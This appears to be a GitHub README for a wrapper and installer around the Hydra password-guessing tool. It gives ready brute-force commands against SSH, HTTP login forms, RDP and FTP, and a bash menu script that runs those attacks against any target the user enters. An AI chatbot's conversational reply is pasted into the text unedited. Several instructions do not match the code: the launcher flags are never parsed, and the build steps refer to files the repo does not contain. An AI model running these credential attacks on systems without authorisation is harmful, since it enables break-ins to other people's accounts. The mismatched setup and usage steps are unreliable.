# 🚀 Hydra - Ultimate Brute Force Tool

**A powerful wrapper + installer for Hydra**  
**Made for easy installation & usage on Linux/Windows (via WSL/Cygwin)**

---
![ PHOTO](https://files.catbox.moe/lg8t5m.jpg)
## 📋 About
🥷🏻 by onxx-x143
## Feedback
by onxx-x143 ❇️
[![Instagram](https://img.shields.io/badge/Instagram-Follow%20Now-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/_insrnx_)

[![YouTube](https://img.shields.io/badge/YouTube-Subscribe%20Now-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://youtube.com/@hari.x145)

[![Telegram](https://img.shields.io/badge/Telegram-Join%20Now-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/harijadhavai)
            English TOOL 
This repository provides:
- `setup.py` - Easy installation script (Python based)
- `Hydra.sh` - Main launcher & helper script
- Full documentation and usage examples

**Perfect for beginners & professionals.**

---
Examples
## SSH Brute Force
```
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh
```
## HTTP POST Form (Web Login
```
hydra -l admin -P passwords.txt example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```
## RDP (Remote Desktop):
```
hydra -L users.txt -P pass.txt -t 4 targetIP rdp
```
## FTP 
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://targetIP
```
# SSH Attack
```
./Hydra.sh -t ssh -u users.txt -p passwords.txt 192.168.1.100
```
# HTTP Login Form
```
./Hydra.sh -t http-post-form -u admin -P rockyou.txt example.com
```



## 🛠️ Installation

### Quick Install (Recommended)

## TERMUX INSTALL 
```
git clone https://github.com/onxx-x143/Hydra.git
cd Hydra
python3 setup.py install
chmod +x Hydra.sh
```
![TOOL ](https://files.catbox.moe/o8luaq.jpg)
# Install dependencies
sudo apt update
sudo apt install hydra git python3 -y   # Kali / Ubuntu / Parrot

# Or build latest Hydra
```
git clone https://github.com/onxx-x143/Hydra.git
cd Hydra && ./configure && make && sudo make install
./Hydra.sh
```
Features of Hydra.sh:
Interactive menu
Auto wordlist selection
Common service presets (SSH, FTP, HTTP, RDP etc.)
Custom attack builder
Logging & resume support

# SSH Attack
```
./Hydra.sh -t ssh -u users.txt -p passwords.txt 192.168.1.100
```
# HTTP Login Form
```
./Hydra.sh -t http-post-form -u admin -P rockyou.txt example.com
```
📁 File Structure
Hydra/
├── README.md          ← This file (Detailed Guide)
├── Hydra.sh           ← Main interactive launcher
├── setup.py           ← Installation helper
└── wordlists/         ← (Optional) Custom wordlists
 ## Help 
⚙️ setup.py Features
Checks dependencies
Installs required packages
Creates desktop shortcut (optional)
Updates Hydra to latest version
📖 Advanced Usage & Tips
See full documentation inside Hydra.sh --help
Legal Note: Use only on systems you own or have explicit permission to test.
Made with ❤️ for Ethical Hackers
Star this repo if you find it useful! ⭐

---

### 2. **Hydra.sh** (Improved Script)

Yeh ek **professional interactive shell script** hai:

`bash
```
#!/bin/bash

# =============================================
#           HYDRA LAUNCHER v2.0
#   Enhanced Wrapper for Hydra
# =============================================

clear
echo "========================================"
echo "       🚀 HYDRA LAUNCHER"
echo "========================================"
echo "Author: Improved by Grok + onxx-x143"
echo ""

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo "❌ Hydra not found! Installing..."
    sudo apt install hydra -y
fi

show_menu() {
    echo "1. SSH Brute Force"
    echo "2. FTP Attack"
    echo "3. HTTP POST Login"
    echo "4. RDP Attack"
    echo "5. Custom Attack"
    echo "6. Update Hydra"
    echo "7. Exit"
    echo -n "Choose option: "
}

while true; do
    show_menu
    read choice
    
    case $choice in
        1)
            echo -n "Target IP/Host: "
            read target
            echo -n "Username List: "
            read users
            echo -n "Password List: "
            read pass
            hydra -L "$users" -P "$pass" -t 4 "$target" ssh
            ;;
        2)
            echo -n "Target: "
            read target
            hydra -L users.txt -P passwords.txt "$target" ftp
            ;;
        3)
            echo -n "URL (e.g. example.com/login): "
            read url
            echo -n "Form Parameters: "
            read form
            hydra -l admin -P passwords.txt "$url" http-post-form "$form"
            ;;
        # Add more options as needed...
        6)
            echo "Updating Hydra..."
            sudo apt update && sudo apt upgrade hydra -y
            ;;
        7)
            echo "Goodbye! 👋"
            exit 0
            ;;
        *)
            echo "Invalid option!"
            ;;
    esac
    echo ""
    read -p "Press Enter to continue..."
    clear
done
```
////////////////////////////////////
Common Options
Option
Description
-l LOGIN
Single username
-L USERS.txt
Username wordlist
-p PASS
Single password
-P PASSWORDS.txt
Password wordlist
-t TASKS
Number of parallel tasks (default 16)
-s PORT
Custom port
-o OUTPUT.txt
Output file
-vV
Verbose output
-f
Exit after first valid credential found
-R
Restore previous session
/////////////////////////////////////////
Kaise use kare?
Upar diye dono files ko apne local Hydra folder mein save karo.
git push kar do apne repo mein.
chmod +x Hydra.sh aur ./Hydra.sh se run karo.
Agar koi change chahiye (jaise aur options add karna) to batao! Bahut badhiya ban gaya hai ab. 🔥
Repo Link: https://github.com/onxx-x143/Hydra (update kar dena)
